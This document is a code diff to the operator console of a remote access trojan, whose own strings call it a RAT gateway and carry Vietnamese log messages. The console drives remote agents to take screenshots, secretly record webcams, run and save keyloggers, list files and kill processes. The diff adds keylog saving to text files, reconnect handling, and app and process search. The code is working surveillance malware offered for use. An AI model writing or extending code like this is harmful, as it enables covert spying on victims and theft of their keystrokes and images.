@@ -2,11 +2,14 @@ import { CONFIG } from './modules/config.js';
 import { Gateway } from './modules/gateway.js';
 import { GatewayDiscovery } from './modules/discovery.js';
 import { LanScanner } from './modules/scanner.js';
+import { DataFormatter, MediaPreview, KeylogManager } from './modules/utils.js';
 
 const appState = {
     isConnected: false,
     sessionId: null,
     agents: [],
+    apps: [],
+    processes: [],
     currentTarget: 'ALL'
 };
 
@@ -50,7 +53,11 @@ const ui = {
 
 let autoConnectState = {
     hasTriedDiscovery: false,
-    isConnecting: false
+    isConnecting: false,
+    reconnectAttempts: 0,
+    maxReconnectAttempts: 5,
+    lastReconnectTime: 0,
+    reconnectDelay: 5000 // 5 seconds
 };
 
 const gateway = new Gateway({
@@ -58,12 +65,14 @@ const gateway = new Gateway({
         ui.log("System", "Đã kết nối tới Gateway! Đang đăng nhập tự động...");
         appState.isConnected = true;
         autoConnectState.isConnecting = false;
-        autoConnectState.hasTriedDiscovery = false; // Reset discovery flag on successful connection
+        autoConnectState.hasTriedDiscovery = false;
+        autoConnectState.reconnectAttempts = 0; // Reset on successful connection
+        
         if (gateway.ws && gateway.ws.url) {
             const url = new URL(gateway.ws.url);
             appState.lastConnectedHost = url.hostname;
         }
-        console.log(`[Auto] Connection established, stopping any ongoing discovery...`);
+        
         setTimeout(() => {
             gateway.authenticate();
         }, 100);
@@ -75,15 +84,27 @@ const gateway = new Gateway({
         autoConnectState.isConnecting = false;
         autoConnectState.hasTriedDiscovery = false;
         
-        // Only auto-reconnect if we were actually connected
-        // Don't reconnect if connection was intentionally closed (code 1001/1000)
-        console.log(`[Auto] Connection lost, will attempt reconnect in 3 seconds...`);
+        // Prevent reconnect loop
+        autoConnectState.reconnectAttempts++;
+        const now = Date.now();
+        const timeSinceLastReconnect = now - autoConnectState.lastReconnectTime;
+        
+        if (autoConnectState.reconnectAttempts > autoConnectState.maxReconnectAttempts) {
+            ui.error("System", `Đã thử kết nối lại ${autoConnectState.maxReconnectAttempts} lần. Dừng auto-reconnect.`);
+            ui.info("System", "Để kết nối lại, gọi: reconnect() hoặc gateway.connect('IP', 8082)");
+            return;
+        }
+        
+        // Wait at least reconnectDelay before attempting reconnect
+        const delay = Math.max(0, autoConnectState.reconnectDelay - timeSinceLastReconnect);
+        
         setTimeout(() => {
             if (!appState.isConnected && !autoConnectState.isConnecting) {
-                console.log(`[Auto] Attempting auto-reconnect...`);
+                autoConnectState.lastReconnectTime = Date.now();
+                ui.info("System", `Đang thử kết nối lại... (${autoConnectState.reconnectAttempts}/${autoConnectState.maxReconnectAttempts})`);
                 autoConnect();
             }
-        }, 3000);
+        }, delay);
     },
     onAuthSuccess: () => {
          ui.log("System", "Đăng nhập thành công! Đang tải danh sách Agent...");
@@ -92,34 +113,21 @@ const gateway = new Gateway({
          }, 500);
     },
     onAgentListUpdate: (agentList) => {
-        ui.log("System", `Cập nhật danh sách Agent: ${agentList.length} thiết bị.`);
-        appState.agents = agentList;
-        if (appState.currentTarget !== 'ALL' && !agentList.find(a => a.id === appState.currentTarget)) {
-            ui.warn("System", `Target ${appState.currentTarget} đã offline. Reset về 'ALL'.`);
-            appState.currentTarget = 'ALL';
-            gateway.setTarget('ALL');
+        ui.log("System", `Tìm thấy ${agentList.length} Agent đang hoạt động.`);
+        appState.agents = agentList; // Lưu vào state toàn cục
+    
+        // Gọi hàm cập nhật của scripts.js
+        if (typeof window.updateAgentListFromGateway === 'function') {
+            window.updateAgentListFromGateway(agentList);
         }
-        ui.updateAgentList(agentList);
     },
     onScreenshot: (base64Data, agentId) => {
         ui.log("Spy", `Nhận ảnh màn hình từ ${agentId}`);
-        const modal = document.getElementById('image-modal');
-        const img = document.getElementById('modal-img');
-        
-        if (img && modal) {
-            img.src = "data:image/jpeg;base64," + base64Data;
-            modal.classList.remove('hidden');
-            modal.style.display = 'block';
-        } else {
-            console.log("%c[ẢNH]", "font-size: 50px; background-image: url(data:image/jpeg;base64," + base64Data + ")");
-        }
+        // MediaPreview will handle display automatically via gateway.js
     },
     onCamera: (videoData, agentId) => {
-        ui.log("Spy", `Nhận video từ ${agentId}, đang tải xuống...`);
-        const link = document.createElement('a');
-        link.href = "data:video/mp4;base64," + videoData;
-        link.download = `cam_${agentId}_${Date.now()}.mp4`;
-        link.click();
+        ui.log("Spy", `Nhận video từ ${agentId}`);
+        // MediaPreview will handle display automatically via gateway.js
     },
     onKeylog: (keyData, agentId) => {
         const keylogPanel = document.getElementById('keylog-panel');
@@ -128,6 +136,14 @@ const gateway = new Gateway({
             keylogPanel.scrollTop = keylogPanel.scrollHeight;
         }
         console.log(`%c[Keylog - ${agentId}]: ${keyData.replace(/\n/g, '\\n')}`, 'color: orange');
+    },
+    onAppListUpdate: (appList) => {
+        ui.log("System", `Cập nhật danh sách App: ${appList.length} ứng dụng.`);
+        appState.apps = appList;
+    },
+    onProcessListUpdate: (processList) => {
+        ui.log("System", `Cập nhật danh sách Process: ${processList.length} tiến trình.`);
+        appState.processes = processList;
     },
     onMessage: (msg) => {
         console.log("Raw Msg: ", msg);
@@ -138,7 +154,24 @@ const gateway = new Gateway({
 });
 
 window.ui = ui;
-window.gateway = gateway; 
+window.gateway = gateway;
+window.appState = appState;
+
+// Expose refreshAgentList function immediately
+window.refreshAgentList = () => {
+    if (gateway && gateway.ws && gateway.ws.readyState === WebSocket.OPEN) {
+        if (gateway.isAuthenticated) {
+            console.log('[Refresh] Đang làm mới danh sách agent...');
+            gateway.refreshAgents();
+        } else {
+            console.warn('[Refresh] Chưa authenticated. Đang đợi...');
+            gateway.authenticate();
+        }
+    } else {
+        console.warn('[Refresh] Gateway chưa kết nối. Đang thử kết nối...');
+        autoConnect();
+    }
+}; 
 
 window.help = () => {
     console.clear();
@@ -147,24 +180,28 @@ window.help = () => {
     console.group("%c1. KẾT NỐI & QUẢN LÝ", "color: #3b82f6");
     console.log("getAgentList()    - fetch agent list")
     console.log("auth()            - Đăng nhập (Bắt buộc sau khi connect)");
-    console.log("discover()        - Tự động tìm Gateway qua mDNS/Bonjour (rat-gateway.local)");
+    console.log("discover()        - Kết nối đến Gateway (IP tĩnh từ config)");
     console.log("scan()            - Quét mạng LAN tìm IP Server (TCP scan)");
     console.log("setTarget('ID')   - Chọn mục tiêu cụ thể (hoặc 'ALL')");
     console.log("whoami()          - Lấy tên máy của mục tiêu");
     console.groupEnd();
 
     console.group("%c2. GIÁN ĐIỆP & THEO DÕI", "color: #ef4444");
-    console.log("screenshot()      - Chụp ảnh màn hình");
-    console.log("recordCam(s)      - Quay lén webcam (s: số giây, mặc định 5)");
+    console.log("screenshot()      - Chụp ảnh màn hình (hiển thị preview)");
+    console.log("recordCam(s)      - Quay lén webcam (s: số giây, mặc định 5, hiển thị preview)");
     console.log("startKeylog()     - Bắt đầu nhận keylog");
     console.log("stopKeylog()      - Dừng keylog");
+    console.log("saveKeylog(name)  - Lưu keylog vào file .txt và xóa trên màn hình");
+    console.log("clearKeylog()     - Xóa keylog trên màn hình");
     console.groupEnd();
 
     console.group("%c3. ỨNG DỤNG & TIẾN TRÌNH", "color: #22c55e");
     console.log("listApps()        - Xem danh sách ứng dụng đã cài");
+    console.log("findApp(query)    - Tìm kiếm app theo tên/path/publisher");
     console.log("startApp(id)      - Mở ứng dụng theo ID (lấy từ listApps)");
     console.log("stopApp(id)       - Tắt ứng dụng theo ID");
     console.log("listProcs()       - Xem danh sách tiến trình đang chạy");
+    console.log("findProc(query)   - Tìm kiếm process theo tên/PID/user");
     console.log("startProc(id)     - (Ít dùng) Chạy process");
     console.log("stopProc(id)      - Kill process theo PID");
     console.groupEnd();
@@ -191,35 +228,19 @@ async function autoConnect() {
     }
     
     autoConnectState.isConnecting = true;
-    ui.info("[Auto] Đang tự động tìm Gateway trên mạng LAN (Discovery)...");
+    ui.info(`[Auto] Đang kết nối đến Gateway: ${CONFIG.GATEWAY_IP}:${CONFIG.GATEWAY_PORT}...`);
     
     try {
-        let found = false;
-        const discoveryPromise = discovery.discover((ip, port) => {
-            found = true;
-            console.log(`[Auto] Discovery callback triggered: ip=${ip}, port=${port}`);
-            ui.log("Auto", `Tìm thấy Gateway trên LAN: ${ip}:${port}`);
-            console.log(`[Auto] Calling gateway.connect('${ip}', ${port})...`);
+        await discovery.discover((ip, port) => {
+            ui.log("Auto", `Kết nối đến Gateway: ${ip}:${port}`);
             gateway.connect(ip, port);
         }, (progress) => {
             if (progress) {
                 ui.info(`[Auto] ${progress}`);
             }
         });
-        
-        const timeoutPromise = new Promise(resolve => setTimeout(() => resolve(false), 12000));
-        const result = await Promise.race([discoveryPromise, timeoutPromise]);
-        
-        if (found || result) {
-            return;
-        }
-        
-        ui.warn("Auto", "Không tìm thấy Gateway trên LAN. Đảm bảo Gateway đang chạy trên mạng.");
-        autoConnectState.hasTriedDiscovery = true;
-        autoConnectState.isConnecting = false;
     } catch (error) {
-        ui.error("Auto", `Discovery error: ${error}`);
-        autoConnectState.hasTriedDiscovery = true;
+        ui.error("Auto", `Connection error: ${error}`);
         autoConnectState.isConnecting = false;
     }
 }
@@ -254,18 +275,21 @@ window.scan = () => {
 };
 
 window.discover = () => {
-    ui.info("[Discovery] Đang tìm Gateway trên mạng LAN...");
+    ui.info("[Discovery] Đang tìm Gateway...");
     discovery.discover((ip, port) => {
-        ui.log("Discovery", `Tìm thấy Gateway tại: ${ip}:${port}`);
+        ui.log("Discovery", `Tìm thấy Gateway: ${ip}:${port}`);
         gateway.connect(ip, port);
         setTimeout(() => gateway.authenticate(), 500);
     }, (progress) => {
-        ui.info(`[Discovery] ${progress}`);
+        if (progress) ui.info(`[Discovery] ${progress}`);
     });
 };
 
 window.reconnect = () => {
     ui.info("[Main] Đang kết nối lại...");
+    // Reset reconnect attempts to allow manual reconnect
+    autoConnectState.reconnectAttempts = 0;
+    autoConnectState.lastReconnectTime = 0;
     autoConnect();
 };
 
@@ -278,10 +302,28 @@ window.setTarget = (agentId) => {
 window.listApps = () => gateway.fetchAppList();
 window.startApp = (id) => gateway.startApp(id);
 window.stopApp = (id) => gateway.killApp(id);
+window.findApp = (query) => {
+    if (!gateway.appsList || gateway.appsList.length === 0) {
+        ui.warn("CMD", "Chưa có danh sách app. Gọi listApps() trước.");
+        return [];
+    }
+    const results = DataFormatter.searchApps(gateway.appsList, query);
+    ui.renderList(`SEARCH APPS: "${query}"`, results);
+    return results;
+};
 
 window.listProcs = () => gateway.fetchProcessList();
 window.startProc = (id) => gateway.startProcess(id);
 window.stopProc = (id) => gateway.killProcess(id);
+window.findProc = (query) => {
+    if (!gateway.processesList || gateway.processesList.length === 0) {
+        ui.warn("CMD", "Chưa có danh sách process. Gọi listProcs() trước.");
+        return [];
+    }
+    const results = DataFormatter.searchProcesses(gateway.processesList, query);
+    ui.renderList(`SEARCH PROCESSES: "${query}"`, results);
+    return results;
+};
 
 window.listFiles = (path = "") => {
     if (path === "") {
@@ -303,6 +345,19 @@ window.startKeylog = () => {
 window.stopKeylog = () => {
     ui.info("[CMD] Tắt Keylogger...");
     gateway.send(CONFIG.CMD.STOP_KEYLOG, "");
+};
+window.saveKeylog = (filename) => {
+    const keylogContent = KeylogManager.getKeylogContent();
+    if (!keylogContent || !keylogContent.trim()) {
+        ui.warn("CMD", "Không có keylog để lưu. Hãy bật keylog trước.");
+        return;
+    }
+    const savedFile = KeylogManager.saveKeylogToFile(keylogContent, filename);
+    ui.log("CMD", `Đã lưu keylog vào file: ${savedFile}`);
+};
+window.clearKeylog = () => {
+    KeylogManager.clearKeylog();
+    ui.log("CMD", "Đã xóa keylog trên màn hình.");
 };
 
 window.shutdownAgent = () => {
